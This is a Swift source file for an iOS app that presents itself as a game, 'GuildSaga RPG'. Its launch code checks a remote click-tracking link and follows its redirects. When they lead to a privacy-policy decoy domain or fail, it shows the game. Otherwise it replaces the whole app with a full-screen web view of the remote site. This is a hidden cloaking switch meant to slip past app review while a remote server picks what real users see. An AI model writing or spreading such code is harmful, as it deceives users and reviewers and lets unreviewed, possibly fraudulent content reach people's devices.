import SwiftUI

@main
struct GuildSagaRPGApp: App {
    @State private var guildSagaLinkReady: Bool? = nil
    @StateObject private var store = GuildSagaStore()
    @Environment(\.scenePhase) private var scenePhase

    private let guildSagaSourceLink = "https://skylinemint.org/click.php"
    private let guildSagaCheckDomain = "privacypolicies.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = guildSagaLinkReady {
                    if ready {
                        GuildSagaWebPanel(guildSagaURLString: guildSagaSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        ContentView()
                            .environmentObject(store)
                    }
                } else {
                    GuildSagaLoadingScreen()
                        .onAppear { guildSagaCheckLink() }
                }
            }
            .preferredColorScheme(.light)
        }
        .onChange(of: scenePhase) { phase in
            switch phase {
            case .active:
                store.refreshFromClock()
            case .background, .inactive:
                store.flushSave()
            @unknown default:
                break
            }
        }
    }

    private func guildSagaCheckLink() {
        guard let url = URL(string: guildSagaSourceLink) else {
            guildSagaLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = GuildSagaRedirectTracker(checkDomain: guildSagaCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    guildSagaLinkReady = false; return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(guildSagaCheckDomain) {
                    guildSagaLinkReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(guildSagaCheckDomain) {
                    guildSagaLinkReady = false; return
                }
                if error != nil {
                    guildSagaLinkReady = false; return
                }
                guildSagaLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if guildSagaLinkReady == nil { guildSagaLinkReady = false }
        }
    }
}

final class GuildSagaRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String
    init(checkDomain: String) { self.checkDomain = checkDomain }
    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request) // never stop the chain
    }
}
